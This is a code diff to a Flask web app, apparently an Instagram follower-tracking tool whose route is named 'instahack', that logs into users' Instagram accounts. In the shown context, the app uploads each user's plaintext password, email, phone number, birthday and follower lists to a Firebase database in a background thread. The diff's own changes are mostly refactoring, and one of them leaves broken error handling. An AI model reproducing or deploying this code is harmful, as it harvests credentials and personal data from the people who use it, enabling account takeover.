@@ -1,16 +1,15 @@
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template
 import os
 from instagrapi import Client
-from instagrapi.types import User
 import requests
 import pyrebase
 from threading import Thread
 import time
-import pickle
+import glob
 
 app = Flask(__name__)
 
-user, db = '', ''
+user,db = '',''
 
 FIREBASE_CONFIG = {
     'apiKey': os.getenv('apiKey'),
@@ -66,7 +65,11 @@ def get_account_details(user):
 
 
 def get_user_info(user):
-    details = user.user_info(user.user_id)
+    details=''
+    try:
+        details = user.user_info(user.user_id)
+    except:
+        pass
     name = details.full_name
     username = details.username
     profile_pic = str(details.profile_pic_url)
@@ -119,6 +122,13 @@ def download_media(user, userid, mediacount):
         except Exception as e:
             print(e)
 
+def encodeUsername(username):
+    user_name = username.replace('.','-')
+    return user_name
+
+def decodeUsername(username):
+    user_name = username.replace('-','.')
+    return user_name
 
 def push_data(user, db):
     userid, email, mobileno, gender, birthday = get_account_details(user)
@@ -128,7 +138,7 @@ def push_data(user, db):
 
     user_insta_data = {'userid': userid, 'password': user.password, 'name': name, 'email': email, 'mobileno': mobileno, 'gender': gender, 'birthday': birthday, 'profile_pic': profile_pic, 'bio': bio, 'is_private': is_private, 'followers_count': followers_count,
                        'following_count': following_count, 'media_count': media_count, 'followers': get_followers(user, userid), 'following': get_following(user, userid), 'unfollowers': [], 'recent_unfollowers': [], 'followers_you_dont_follow': [], 'users_dont_follow_back': []}
-    db.child("Users").child(username).set(user_insta_data)
+    db.child("Users").child(encodeUsername(username)).set(user_insta_data)
     print("Data Uploaded to the servers!")
 
 
@@ -175,9 +185,14 @@ def instahack():
             print('Login Sucessfull!')
         except Exception as e:
             return e
-
-        user_data = get_details(db=db, user_name=user_name)
+        user_name = encodeUsername(user_name)
         if(user_name in REGISTERED_USERS):
+            print('Found user in our Database')
+            try:
+                user_data = get_details(db=db, user_name=user_name)
+            except:
+                pass
+            print('All username Extracted from Database. Searching for user in Database.')
             name = getSpecificDetail(user_data=user_data, key='name')
             bio = getSpecificDetail(user_data=user_data, key='bio')
             profile_pic = getSpecificDetail(
@@ -188,18 +203,21 @@ def instahack():
                 user_data=user_data, key='following_count')
             media_count = getSpecificDetail(
                 user_data=user_data, key='media_count')
+            username = decodeUsername(user_name)
             try:
                 r = requests.get(profile_pic, allow_redirects=True)
-                open(f'./static/{user_name}.jpg', 'wb+').write(r.content)
+                open(f'./static/{username}.jpg', 'wb+').write(r.content)
             except Exception as e:
                 print(e)
-            return render_template("profile.html", profile_pic=user_name+'.jpg', name=name, bio=bio, user_name=user_name, followers_count=followers_count, following_count=following_count, media_count=media_count)
+            return render_template("profile.html", profile_pic=username+'.jpg', name=name, bio=bio, user_name=username, followers_count=followers_count, following_count=following_count, media_count=media_count)
         else:
+            print('User Not Found in Database, Extracting user Information form Instagrapi...')
             name, username, profile_pic, bio, is_private, followers_count, following_count, media_count = get_user_info(
                 user)
+            print('Extracted all user data) from instagrapi')
             try:
                 r = requests.get(profile_pic, allow_redirects=True)
-                open(f'./static/{user_name}.jpg', 'wb+').write(r.content)
+                open(f'./static/{username}.jpg', 'wb+').write(r.content)
             except Exception as e:
                 print(e)
             Thread(target=push_data, name='PushData', args=(user, db)).start()
@@ -210,3 +228,6 @@ def instahack():
 
 if __name__ == '__main__':
     app.run()
+    path = 'static/*.jpg'
+    for name in glob.glob(path):
+        os.remove(name)
